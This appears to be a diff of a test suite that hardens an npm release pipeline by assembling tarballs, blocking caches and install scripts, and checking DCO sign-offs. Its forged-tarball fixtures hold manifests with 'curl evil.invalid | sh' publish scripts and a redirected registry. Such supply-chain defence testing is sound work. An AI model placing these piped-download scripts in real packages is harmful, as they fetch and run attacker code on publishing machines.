@@ -23,31 +23,39 @@
  * - A dry run never pushes, publishes or creates a release.
  * - The CI gate fails closed and names the check: missing, pending, skipped and failed CI
  *   jobs, no CI run at all, and an unreadable registry all stop the release.
- * - Publishing checks every tarball's name and version before publishing any.
+ * - Publishing assembles every tarball (scripts/release-tarball.py, pinned in
+ *   release-tarball.test.ts) before publishing any, and npm is handed only those: from an
+ *   empty directory, with --ignore-scripts, an explicit registry and a fresh private cache.
+ * - No setup-node restores a cache, and the publish job installs, packs and runs nothing.
  * - Republish gates on the release commit's parent only when the release commit changes
  *   nothing but the lockstep package.json "version" fields.
  */
 
-import { spawnSync } from "node:child_process";
+import { execFileSync, spawnSync } from "node:child_process";
+import { createHash } from "node:crypto";
 import {
 	chmodSync,
 	existsSync,
 	mkdirSync,
 	mkdtempSync,
+	readdirSync,
 	readFileSync,
 	rmSync,
 	symlinkSync,
 	writeFileSync,
 } from "node:fs";
+import { createRequire } from "node:module";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { parse } from "yaml";
+import { archive, gz, member, readTar } from "./tar-fixture.js";
 
 const ROOT = resolve(import.meta.dirname, "../../../..");
 const PUBLISH = join(ROOT, ".github/workflows/publish.yml");
 const CI = join(ROOT, ".github/workflows/ci.yml");
 const SCRIPT = join(ROOT, "scripts/release.sh");
+const TOOL = join(ROOT, "scripts/release-tarball.py");
 
 interface Step {
 	name?: string;
@@ -305,6 +313,38 @@ describe("publish.yml", () => {
 		const withToken = allSteps().filter(([, s]) => JSON.stringify(s).includes("NPM_TOKEN"));
 		expect(withToken.map(([j, s]) => `${j}: ${s.name}`)).toEqual(["publish: Publish packages"]);
 	});
+
+	it("no setup-node restores a cache, and no step is a cache step", () => {
+		const setups = allSteps().filter(([, s]) => s.uses?.startsWith("actions/setup-node@"));
+		expect(setups.map(([j]) => j)).toEqual(["build", "publish"]);
+		for (const [job, s] of setups) {
+			expect(s.with?.["package-manager-cache"], `${job}: setup-node`).toBe(false);
+			expect(s.with ?? {}, `${job}: setup-node`).not.toHaveProperty("cache");
+			expect(s.with ?? {}, `${job}: setup-node`).not.toHaveProperty("cache-dependency-path");
+		}
+		for (const [job, s] of allSteps()) {
+			expect(s.uses ?? "", `${job}: ${s.name}`).not.toMatch(/^actions\/cache\b/);
+		}
+	});
+
+	it("the publish job installs, packs, runs and caches nothing", () => {
+		for (const s of jobSteps("publish")) {
+			expect(s.run ?? "", `publish: ${s.name}`).not.toMatch(
+				/\bnpm\s+(ci|install|i|pack|run|run-script|exec|rebuild|cache)\b|\bnpx\b|actions\/cache/,
+			);
+		}
+		const publishes = jobSteps("publish").filter((s) => /release\.sh publish\b/.test(s.run ?? ""));
+		expect(publishes.map((s) => s.name)).toEqual([
+			"Publish packages (dry run)",
+			"Publish packages",
+		]);
+	});
+
+	it("the release commit is made with a DCO sign-off", () => {
+		const run = step("build", "Commit and tag (local)").run ?? "";
+		const commits = run.split("\n").filter((l) => /\bgit commit\b/.test(l));
+		expect(commits.map((l) => l.trim())).toEqual([`git commit -s -m "release: v$${"{"}VERSION}"`]);
+	});
 });
 
 // ── scripts/release.sh against a fake npm, gh and git history ──
@@ -320,9 +360,13 @@ const NAMES: Record<string, string> = {
 };
 
 const FAKE_NPM = `#!/usr/bin/env bash
+# Every call's subcommand is appended to $FAKE_CALLS.
 # view <spec> version: answers from $FAKE_REGISTRY ("<spec> yes|no|error" lines; unlisted = no).
-# pack ...: writes a real tarball of ./package.json to --pack-destination; logs "pack|<dir>|<args>".
-# publish <tgz> ...: records what it was given, and where, in $FAKE_LOG.
+# pack ...: writes a ustar tarball, as npm's packer does, of package.json, README.md, LICENSE,
+#   NOTICE and dist/ to --pack-destination; logs "pack|<dir>|<args>".
+# publish <tgz> ...: records what it was given, and where, in $FAKE_LOG, and keeps a copy of the
+#   tarball as $FAKE_LOG.<tarball name>.
+echo "$1" >> "$FAKE_CALLS"
 case "$1" in
 pack)
 	echo "pack|$(basename "$PWD")|$*" >> "$FAKE_LOG"
@@ -331,12 +375,18 @@ pack)
 		[ "$1" = --pack-destination ] && dest="$2"
 		shift
 	done
-	name=$(node -p 'require("./package.json").name')
-	ver=$(node -p 'require("./package.json").version')
-	tmp=$(mktemp -d)
-	mkdir "$tmp/package"
-	cp package.json "$tmp/package/"
-	tar -czf "$dest/$name-$ver.tgz" -C "$tmp" package
+	python3 - "$dest" <<'PY'
+import json, os, sys, tarfile
+m = json.load(open("package.json"))
+paths = ["package.json"] + [p for p in ("README.md", "LICENSE", "NOTICE") if os.path.isfile(p)]
+for top, dirs, files in os.walk("dist"):
+    dirs.sort()
+    paths += [os.path.join(top, f) for f in sorted(files)]
+out = os.path.join(sys.argv[1], m["name"] + "-" + m["version"] + ".tgz")
+with tarfile.open(out, "w:gz", format=tarfile.USTAR_FORMAT) as t:
+    for p in paths:
+        t.add(p, arcname="package/" + p, recursive=False)
+PY
 	;;
 view)
 	state=$(awk -v s="$2" '$1 == s { print $2 }' "$FAKE_REGISTRY")
@@ -363,7 +413,20 @@ publish)
 		shift
 	done
 	cwd=$(ls -A | wc -l | tr -d ' ')
-	echo "publish|$(basename "$tgz")|\${flags# }|cwd=\${cwd}|userconfig=$(tr '\n' ';' < "$cfg")|globalconfig=$(wc -c < "$gcfg" | tr -d ' ')" >> "$FAKE_LOG"
+	cache=missing
+	if [ -n "\${npm_config_cache:-}" ] && [ -d "$npm_config_cache" ]; then
+		cache=used
+		if [ -z "$(ls -A "$npm_config_cache")" ]; then cache=fresh; fi
+		case "$(ls -ld "$npm_config_cache")" in drwx------*) ;; *) cache="$cache-shared" ;; esac
+		echo "$npm_config_cache" >> "$FAKE_LOG.caches"
+	fi
+	case "$tgz" in
+	"$FAKE_ARTIFACTS"/*) from=artifact ;;
+	/*) from=assembled ;;
+	*) from=relative ;;
+	esac
+	cp "$tgz" "$FAKE_LOG.$(basename "$tgz")"
+	echo "publish|$(basename "$tgz")|\${flags# }|cwd=\${cwd}|userconfig=$(tr '\n' ';' < "$cfg")|globalconfig=$(wc -c < "$gcfg" | tr -d ' ')|cache=\${cache}|from=\${from}" >> "$FAKE_LOG"
 	;;
 *) echo "fake npm: unexpected $*" >&2; exit 99 ;;
 esac
@@ -419,7 +482,7 @@ function gitEnv(): NodeJS.ProcessEnv {
 function writePackages(version: string, extra: Record<string, unknown> = {}): void {
 	for (const d of DIRS) {
 		mkdirSync(join(repo, "packages", d), { recursive: true });
-		const pkg = { name: NAMES[d], version, license: "Apache-2.0", ...extra };
+		const pkg = { name: NAMES[d], version, license: "Apache-2.0", files: ["dist"], ...extra };
 		writeFileSync(
 			join(repo, "packages", d, "package.json"),
 			`${JSON.stringify(pkg, null, "\t")}\n`,
@@ -495,10 +558,13 @@ function packAll(): string {
 	return out;
 }
 
+/** The fake npm's log line for each publish: the assembled tarball, from an empty directory,
+ * with the exact flags, our user config (the token reference only), an empty global config
+ * and a fresh private cache. */
 const published = (version: string, dirs: string[], dry: boolean) =>
 	dirs.map(
 		(d) =>
-			`publish|${NAMES[d]}-${version}.tgz|--access public --provenance --registry https://registry.npmjs.org/${dry ? " --dry-run" : ""}|cwd=0|userconfig=${dry ? "" : `//registry.npmjs.org/:_authToken=$${"{"}NODE_AUTH_TOKEN};`}|globalconfig=0`,
+			`publish|${NAMES[d]}-${version}.tgz|--access public --provenance --ignore-scripts --registry https://registry.npmjs.org/${dry ? " --dry-run" : ""}|cwd=0|userconfig=${dry ? "" : `//registry.npmjs.org/:_authToken=$${"{"}NODE_AUTH_TOKEN};`}|globalconfig=0|cache=fresh|from=assembled`,
 	);
 
 function run(args: string[], env: Record<string, string> = {}) {
@@ -513,6 +579,8 @@ function run(args: string[], env: Record<string, string> = {}) {
 			FAKE_RUNS: join(dir, "runs.json"),
 			FAKE_JOBS: join(dir, "jobs.json"),
 			FAKE_LOG: join(dir, "log"),
+			FAKE_CALLS: join(dir, "calls"),
+			FAKE_ARTIFACTS: join(dir, "tarballs"),
 			FAKE_ENV: join(dir, "env.json"),
 			GITHUB_REPOSITORY: "owner/repo",
 			REQUIRED_CI_JOBS: publish.env?.REQUIRED_CI_JOBS ?? "",
@@ -552,6 +620,7 @@ beforeEach(() => {
 	}
 	mkdirSync(join(repo, "scripts"), { recursive: true });
 	writeFileSync(join(repo, "scripts/release.sh"), readFileSync(SCRIPT, "utf8"));
+	writeFileSync(join(repo, "scripts/release-tarball.py"), readFileSync(TOOL, "utf8"));
 	writePackages("1.0.0");
 	writeFileSync(join(repo, "README"), "x\n");
 	git("init", "-q", "-b", "master");
@@ -623,26 +692,76 @@ describe("release.sh publish", { timeout: 30_000 }, () => {
 		expect(log()).toEqual([]);
 	});
 
-	it("publishes nothing if a tarball holds another version than its name says", () => {
+	it("publishes nothing if any build tarball is refused", () => {
 		const out = packAll();
-		const tmp = join(dir, "forged");
-		mkdirSync(join(tmp, "package"), { recursive: true });
 		writeFileSync(
-			join(tmp, "package/package.json"),
-			JSON.stringify({ name: "usertrust-server", version: "1.0.9" }),
-		);
-		const t = spawnSync("tar", [
-			"-czf",
 			join(out, "usertrust-server-1.0.0.tgz"),
-			"-C",
-			tmp,
-			"package",
-		]);
-		expect(t.status).toBe(0);
+			gz(archive(member("package/package.json", "{}"), member("package/dist/.npmrc", "x"))),
+		);
 		const r = run(["publish", out, "HEAD"]);
 		expect(r.status).not.toBe(0);
-		expect(r.err).toContain('version is "1.0.9", not 1.0.0');
+		expect(r.err).toContain("begins or ends with a dot");
+		expect(r.err).toContain("usertrust-server-1.0.0.tgz from the build was refused");
 		expect(log()).toEqual([]);
+	});
+
+	it("npm is called only to look up versions and to publish, never to pack or install", () => {
+		const out = packAll();
+		rmSync(join(dir, "calls"), { force: true });
+		expect(run(["publish", out, "HEAD"]).status).toBe(0);
+		const calls = new Set(readFileSync(join(dir, "calls"), "utf8").trim().split("\n"));
+		expect([...calls].sort()).toEqual(["publish", "view"]);
+	});
+
+	it("each publish gets its own fresh, private npm cache", () => {
+		const out = packAll();
+		expect(run(["publish", out, "HEAD"]).status).toBe(0);
+		const caches = readFileSync(join(dir, "log.caches"), "utf8").trim().split("\n");
+		expect(caches.length).toBe(6);
+		expect(new Set(caches).size).toBe(6);
+		for (const c of caches) expect(c.startsWith(join(dir, "tarballs"))).toBe(false);
+	});
+
+	it("refuses a root file the commit records as a symlink", () => {
+		symlinkSync("../../README", join(repo, "packages/core/LICENSE"));
+		git("add", "-A");
+		git("commit", "-q", "-m", "linked LICENSE");
+		const out = packAll();
+		const r = run(["publish", out, "HEAD", "--dry-run"]);
+		expect(r.status).not.toBe(0);
+		expect(r.err).toContain(
+			"packages/core/LICENSE in HEAD is not a regular file (tree entry: '120000",
+		);
+		expect(log()).toEqual([]);
+	});
+
+	it("refuses a root file the manifest lists but the commit lacks", () => {
+		writePackages("1.0.0", { files: ["dist", "NOTICE"] });
+		git("commit", "-q", "-am", "lists NOTICE");
+		const out = packAll();
+		const r = run(["publish", out, "HEAD", "--dry-run"]);
+		expect(r.status).not.toBe(0);
+		expect(r.err).toContain(
+			"packages/core/NOTICE in HEAD is not a regular file (tree entry: none)",
+		);
+		expect(log()).toEqual([]);
+	});
+
+	it("needs a files list in each manifest, of dist and plain root files only", () => {
+		for (const [files, message] of [
+			[undefined, 'has no "files" list'],
+			[["dist", "src/x.js"], '"files" entry "src/x.js" is neither dist'],
+			[["dist", ".npmrc"], '"files" entry ".npmrc" is neither dist'],
+			[["dist", "*.json"], '"files" entry "*.json" is neither dist'],
+		] as const) {
+			writePackages("1.0.0", { files });
+			git("commit", "-q", "-am", "files");
+			const out = packAll();
+			const r = run(["publish", out, "HEAD", "--dry-run"]);
+			expect(r.status, JSON.stringify(files)).not.toBe(0);
+			expect(r.err).toContain(message);
+			expect(log()).toEqual([]);
+		}
 	});
 
 	it("refuses packages that disagree on the version", () => {
@@ -911,6 +1030,7 @@ describe("release.sh gate (republish)", { timeout: 30_000 }, () => {
 		repo = shallow;
 		mkdirSync(join(repo, "scripts"), { recursive: true });
 		writeFileSync(join(repo, "scripts/release.sh"), readFileSync(SCRIPT, "utf8"));
+		writeFileSync(join(repo, "scripts/release-tarball.py"), readFileSync(TOOL, "utf8"));
 		const r = run(["gate"], { REPUBLISH: "true" });
 		expect(r.status).not.toBe(0);
 		expect(r.err).toContain("shallow");
@@ -1075,7 +1195,10 @@ describe("release.sh treats build output as data", { timeout: 30_000 }, () => {
 
 	describe("the build job's bundle", () => {
 		/** The build job's work, in a clone: bump, commit, tag, bundle on top of the base. */
-		const bundleFrom = (arrange: (clone: string) => void = () => {}) => {
+		const bundleFrom = (
+			arrange: (clone: string) => void = () => {},
+			commitArgs: string[] = ["-s", "-m", "release: v1.0.1"],
+		) => {
 			const clone = join(dir, "build");
 			gitIn(dir, "clone", "-q", repo, clone);
 			const base = gitIn(clone, "rev-parse", "HEAD");
@@ -1084,7 +1207,7 @@ describe("release.sh treats build output as data", { timeout: 30_000 }, () => {
 			writePackages("1.0.1");
 			arrange(clone);
 			git("add", "-A");
-			git("commit", "-q", "-m", "release: v1.0.1");
+			git("commit", "-q", ...commitArgs);
 			git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
 			const bundle = join(dir, "release.bundle");
 			git("bundle", "create", "-q", bundle, "refs/tags/v1.0.1", `^${base}`);
@@ -1117,6 +1240,25 @@ describe("release.sh treats build output as data", { timeout: 30_000 }, () => {
 			expect(r.err).toContain("sits on");
 		});
 
+		const signoff = "Signed-off-by: t <t@example.com>";
+		for (const [what, args] of [
+			["no DCO sign-off", ["-m", "release: v1.0.1"]],
+			["a sign-off by someone else", ["-m", "release: v1.0.1\n\nSigned-off-by: x <x@example.com>"]],
+			[
+				"another trailer as well",
+				["-m", `release: v1.0.1\n\n${signoff}\nCo-authored-by: x <x@example.com>`],
+			],
+			["a body as well", ["-m", `release: v1.0.1\n\nmore text\n\n${signoff}`]],
+			["another subject", ["-s", "-m", "release: v1.0.1 (and more)"]],
+		] as const) {
+			it(`refuses a release commit with ${what}`, () => {
+				const bundle = bundleFrom(() => {}, [...args]);
+				const r = run(["verify-release", bundle, "1.0.1"]);
+				expect(r.status).not.toBe(0);
+				expect(r.err).toContain("committer's DCO sign-off");
+			});
+		}
+
 		it("refuses a release commit that adds publishConfig", () => {
 			const bundle = bundleFrom((clone) =>
 				writeFileSync(
@@ -1130,63 +1272,58 @@ describe("release.sh treats build output as data", { timeout: 30_000 }, () => {
 		});
 	});
 
-	describe("each tarball's manifest must equal the commit's", () => {
-		const forge = (out: string, d: string, manifest: Record<string, unknown>) => {
-			const tmp = join(dir, `forge-${d}`);
-			mkdirSync(join(tmp, "package"), { recursive: true });
-			writeFileSync(join(tmp, "package/package.json"), JSON.stringify(manifest));
-			const t = spawnSync("tar", [
-				"-czf",
+	describe("the build's root files are discarded: what is published carries the commit's", () => {
+		const forge = (out: string, d: string, manifest: Record<string, unknown>) =>
+			writeFileSync(
 				join(out, `${NAMES[d]}-1.0.0.tgz`),
-				"-C",
-				tmp,
-				"package",
-			]);
-			expect(t.status).toBe(0);
-		};
+				gz(
+					archive(
+						member("package/package.json", JSON.stringify(manifest)),
+						member("package/README.md", "a README the build wrote\n"),
+						member("package/dist/index.js", "export {};\n"),
+					),
+				),
+			);
 		const base = (d: string) => ({ name: NAMES[d], version: "1.0.0", license: "Apache-2.0" });
+		/** The package/package.json npm was handed for <d>, from the fake npm's copy. */
+		const handed = (d: string) =>
+			readTar(readFileSync(join(dir, `log.${NAMES[d]}-1.0.0.tgz`)))
+				.find((e) => e.name === "package/package.json")
+				?.data.toString("utf8");
 
-		const cases: [string, string, Record<string, unknown>, string][] = [
+		const cases: [string, string, Record<string, unknown>][] = [
 			[
 				"an injected publishConfig.registry",
 				"server",
 				{ ...base("server"), publishConfig: { registry: "https://evil.invalid/" } },
-				"publishConfig is not allowed",
 			],
 			[
 				"an added prepublishOnly script",
 				"verify",
 				{ ...base("verify"), scripts: { prepublishOnly: "curl evil.invalid | sh" } },
-				'field "scripts" differs',
 			],
 			[
 				"an added postpublish script",
 				"ui",
 				{ ...base("ui"), scripts: { postpublish: "curl evil.invalid | sh" } },
-				'field "scripts" differs',
 			],
-			[
-				"a changed name",
-				"core",
-				{ ...base("core"), name: "@evil/usertrust" },
-				"the manifest names",
-			],
-			[
-				"any other changed field",
-				"openclaw",
-				{ ...base("openclaw"), license: "UNLICENSED" },
-				'field "license" differs',
-			],
+			["a changed name", "core", { ...base("core"), name: "@evil/usertrust" }],
+			["another version", "acs-adapter", { ...base("acs-adapter"), version: "1.0.9" }],
 		];
-		for (const [what, d, manifest, message] of cases) {
-			it(`refuses ${what}, and publishes nothing`, () => {
+		for (const [what, d, manifest] of cases) {
+			it(`a build manifest with ${what} never reaches npm`, () => {
 				const out = packAll();
 				forge(out, d, manifest);
 				const r = run(["publish", out, "HEAD", "--dry-run"]);
-				expect(r.status).not.toBe(0);
-				expect(r.err).toContain(message);
-				expect(r.err).toContain("refusing to publish anything");
-				expect(log()).toEqual([]);
+				expect(r.status, r.err).toBe(0);
+				expect(log()).toEqual(published("1.0.0", DIRS, true));
+				const commit = git("show", `HEAD:packages/${d}/package.json`);
+				expect(handed(d)?.trimEnd()).toBe(commit);
+				const entries = readTar(readFileSync(join(dir, `log.${NAMES[d]}-1.0.0.tgz`)));
+				expect(entries.map((e) => e.name)).toEqual([
+					"package/dist/index.js",
+					"package/package.json",
+				]);
 			});
 		}
 
@@ -1220,5 +1357,102 @@ describe("release.sh treats build output as data", { timeout: 30_000 }, () => {
 				);
 			});
 		}
+	});
+});
+
+// ── The upload path: what npm is handed is exactly what was assembled ──
+
+describe("npm publish is handed exactly the assembled tarball", { timeout: 120_000 }, () => {
+	/** Packages as they ship: dist/, README.md, LICENSE and NOTICE in each, all committed. */
+	const realistic = () => {
+		writePackages("1.0.0", { files: ["dist", "LICENSE", "NOTICE"] });
+		for (const d of DIRS) {
+			const p = join(repo, "packages", d);
+			writeFileSync(join(p, "README.md"), `# ${NAMES[d]}\n`);
+			writeFileSync(join(p, "LICENSE"), "Apache License 2.0\n");
+			writeFileSync(join(p, "NOTICE"), "NOTICE\n");
+			mkdirSync(join(p, "dist", "cli"), { recursive: true });
+			writeFileSync(join(p, "dist", "index.js"), `export const name = "${NAMES[d]}";\n`);
+			writeFileSync(join(p, "dist", "cli", "main.js"), "#!/usr/bin/env node\n");
+		}
+		git("add", "-A");
+		git("commit", "-q", "-m", "realistic packages");
+	};
+
+	/** The tarball an independent run of the assembler writes for <d> from the build's tarball. */
+	const assembleAlone = (out: string, d: string): Buffer => {
+		const roots = mkdtempSync(join(dir, `roots-${d}-`));
+		const args: string[] = [];
+		for (const name of ["package.json", "README.md", "LICENSE", "NOTICE"]) {
+			writeFileSync(join(roots, name), `${git("show", `HEAD:packages/${d}/${name}`)}\n`);
+			args.push("--root", `${name}=${join(roots, name)}`);
+		}
+		const target = join(roots, "out.tgz");
+		const r = spawnSync(
+			"python3",
+			[
+				"-I",
+				TOOL,
+				"assemble",
+				"--input",
+				join(out, `${NAMES[d]}-1.0.0.tgz`),
+				"--output",
+				target,
+				"--mtime",
+				git("show", "-s", "--format=%ct", "HEAD"),
+				...args,
+			],
+			{ encoding: "utf8" },
+		);
+		expect(r.status, r.stderr).toBe(0);
+		return readFileSync(target);
+	};
+
+	it("the exact command, for every package, with the assembled file as its only tarball", () => {
+		realistic();
+		const out = packAll();
+		const r = run(["publish", out, "HEAD"]);
+		expect(r.status, r.err).toBe(0);
+		expect(log()).toEqual(published("1.0.0", DIRS, false));
+		for (const d of DIRS) {
+			const handed = readFileSync(join(dir, `log.${NAMES[d]}-1.0.0.tgz`));
+			expect(handed.equals(assembleAlone(out, d)), NAMES[d]).toBe(true);
+			// And it is not the build's tarball.
+			expect(handed.equals(readFileSync(join(out, `${NAMES[d]}-1.0.0.tgz`)))).toBe(false);
+			expect(readTar(handed).map((e) => e.name)).toEqual([
+				"package/LICENSE",
+				"package/NOTICE",
+				"package/README.md",
+				"package/dist/cli/main.js",
+				"package/dist/index.js",
+				"package/package.json",
+			]);
+		}
+	});
+
+	it("npm's reader takes the commit's manifest from those bytes, and digests exactly them", async () => {
+		realistic();
+		const out = packAll();
+		expect(run(["publish", out, "HEAD", "--dry-run"]).status).toBe(0);
+		const npmRequire = createRequire(
+			join(execFileSync("npm", ["root", "-g"], { encoding: "utf8" }).trim(), "npm", "package.json"),
+		);
+		const pacote = npmRequire("pacote") as {
+			manifest: (
+				spec: string,
+				opts: { cache: string },
+			) => Promise<{ name: string; version: string; _integrity: string }>;
+		};
+		const file = join(dir, "log.usertrust-server-1.0.0.tgz");
+		const m = await pacote.manifest(`file:${file}`, { cache: join(dir, "pacote-cache") });
+		const sha512 = createHash("sha512").update(readFileSync(file)).digest("base64");
+		expect([m.name, m.version, m._integrity]).toEqual([
+			"usertrust-server",
+			"1.0.0",
+			`sha512-${sha512}`,
+		]);
+		expect(readdirSync(dir).filter((f) => f.startsWith("log.") && f.endsWith(".tgz")).length).toBe(
+			6,
+		);
 	});
 });
